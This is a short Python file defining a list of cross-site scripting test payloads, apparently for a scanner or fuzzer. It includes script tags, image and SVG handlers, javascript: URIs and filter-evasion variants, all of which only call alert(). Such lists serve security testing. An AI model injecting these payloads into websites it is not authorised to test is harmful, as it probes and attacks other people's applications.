from typing import List

XSS_PAYLOADS: List[str] = [
    # Basic
    "<script>alert(1)</script>",
    "<script>alert('XSS')</script>",
    "<script>alert(document.domain)</script>",

    # Image / SVG based
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert(1)>",
    "<svg/onload=alert(1)>",
    "<svg><script>alert(1)</script></svg>",

    # Event handlers
    "\"><img src=x onerror=alert(1)>",
    "'><img src=x onerror=alert(1)>",
    "\" onmouseover=alert(1) ",
    "' onmouseover=alert(1) ",
    "\" onfocus=alert(1) tabindex=1 ",
    "' onfocus=alert(1) tabindex=1 ",

    # JavaScript URI
    "javascript:alert(1)",
    "javascript:alert('XSS')",

    # Bypass / Filter evasion attempts
    "<scr<script>ipt>alert(1)</script>",
    "<img src=x onerror=alert`1`>",
    "<img src=x onerror=alert(String.fromCharCode(88,83,83))>",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<math><mtext></mtext><script>alert(1)</script></math>",

    # Reflection test marker
    "xss-test-reflection-98765",
    "xss\"'<>test",
]